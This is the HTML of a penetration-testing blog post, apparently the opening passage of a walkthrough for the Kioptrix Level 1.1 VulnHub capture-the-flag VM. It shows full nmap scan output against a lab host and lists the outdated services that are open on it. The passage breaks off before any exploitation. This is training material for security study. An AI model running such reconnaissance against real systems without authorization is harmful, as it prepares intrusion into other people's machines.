@@ -1,0 +1,431 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Kioptrix Level 1.1 CTF VM WalkThrough" /><meta name="author" content="Ajay Kumat Tekam" /><meta property="og:locale" content="en_US" /><meta name="description" content="VM : Kioptrix: Level 1.1" /><meta property="og:description" content="VM : Kioptrix: Level 1.1" /><link rel="canonical" href="https://ajaytekam.github.io/posts/Kioptrix-Level-1.1-CTF-VM-WalkThrough/" /><meta property="og:url" content="https://ajaytekam.github.io/posts/Kioptrix-Level-1.1-CTF-VM-WalkThrough/" /><meta property="og:site_name" content="Ajay Kumar Tekam" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-06-24T10:03:45+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Kioptrix Level 1.1 CTF VM WalkThrough" /><meta name="twitter:site" content="@x90ajay" /><meta name="twitter:creator" content="@Ajay Kumat Tekam" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"VM : Kioptrix: Level 1.1","url":"https://ajaytekam.github.io/posts/Kioptrix-Level-1.1-CTF-VM-WalkThrough/","@type":"BlogPosting","headline":"Kioptrix Level 1.1 CTF VM WalkThrough","dateModified":"2020-06-24T10:03:45+05:30","datePublished":"2020-06-24T10:03:45+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"https://ajaytekam.github.io/posts/Kioptrix-Level-1.1-CTF-VM-WalkThrough/"},"author":{"@type":"Person","name":"Ajay Kumat Tekam"},"@context":"https://schema.org"}</script><title>Kioptrix Level 1.1 CTF VM WalkThrough | Ajay Kumar Tekam</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/33233365?s=460&u=83f149b0c63860593a37a0e0fff6ccdfb224a27e&v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ajay Kumar Tekam</a></div><div class="site-subtitle font-italic">Web-Application & Network Penetration Tester | Bug Hunter</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Ajaytekam" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://linkedin.com/in/ajaytekam" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://twitter.com/x90ajay" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['contact.mtsec','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Kioptrix Level 1.1 CTF VM WalkThrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Kioptrix Level 1.1 CTF VM WalkThrough</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Jun 24, 2020, 10:03 AM +0530" > Jun 24, 2020 <i class="unloaded">2020-06-24T10:03:45+05:30</i> </span> by <span class="author"> Ajay Kumat Tekam </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1540 words">8 min</span></div></div><div class="post-content"><p><strong>VM :</strong> Kioptrix: Level 1.1</p><p>Download Link : https://download.vulnhub.com/kioptrix/Kioptrix_Level_2-update.rar</p><h3 id="nmap-scan">Nmap Scan</h3><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.80 scan initiated Thu Apr 16 13:44:53 2020 as: nmap -A -oN nmap.scan 192.168.1.4                                                                                                                  [0/1246]</span>
+Nmap scan report <span class="k">for </span>192.168.1.4
+Host is up <span class="o">(</span>0.00042s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 994 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 3.9p1 <span class="o">(</span>protocol 1.99<span class="o">)</span>
+| ssh-hostkey:
+|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 <span class="o">(</span>RSA1<span class="o">)</span>
+|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 <span class="o">(</span>DSA<span class="o">)</span>
+|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 <span class="o">(</span>RSA<span class="o">)</span>
+|_sshv1: Server supports SSHv1
+80/tcp   open  http       Apache httpd 2.0.52 <span class="o">((</span>CentOS<span class="o">))</span>
+|_http-server-header: Apache/2.0.52 <span class="o">(</span>CentOS<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
+111/tcp  open  rpcbind    2 (RPC #100000)
+443/tcp  open  ssl/https?
+|_ssl-date: 2020-04-16T10:36:08+00:00; -3h09m42s from scanner time.
+| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|_    SSL2_RC4_64_WITH_MD5
+631/tcp  open  ipp        CUPS 1.1
+| http-methods:
+|_  Potentially risky methods: PUT
+|_http-server-header: CUPS/1.1
+|_http-title: 403 Forbidden
+3306/tcp open  mysql      MySQL (unauthorized)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.27
+Network Distance: 2 hops
+
+Host script results:
+|_clock-skew: -3h09m42s
+
+TRACEROUTE (using port 256/tcp)
+HOP RTT     ADDRESS
+1   0.05 ms 172.17.0.1
+2   0.32 ms 192.168.1.4
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Apr 16 13:46:48 2020 -- 1 IP address (1 host up) scanned in 115.94 seconds
+</span></pre></table></code></div></div><p>Open ports are :</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>22/tcp   open  ssh        OpenSSH 3.9p1 <span class="o">(</span>protocol 1.99<span class="o">)</span>
+80/tcp   open  http       Apache httpd 2.0.52 <span class="o">((</span>CentOS<span class="o">))</span>
+111/tcp  open  rpcbind    2 <span class="o">(</span>RPC <span class="c">#100000)</span>
+443/tcp  open  ssl/https?
+631/tcp  open  ipp        CUPS 1.1
+3306/tcp open  mysql      MySQL <span class="o">(</span>unauthorized<span class="o">)</span>  
+</pre></table></code></div></div><p>Port 80 is open. There is a web page</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="data:image/png;base64,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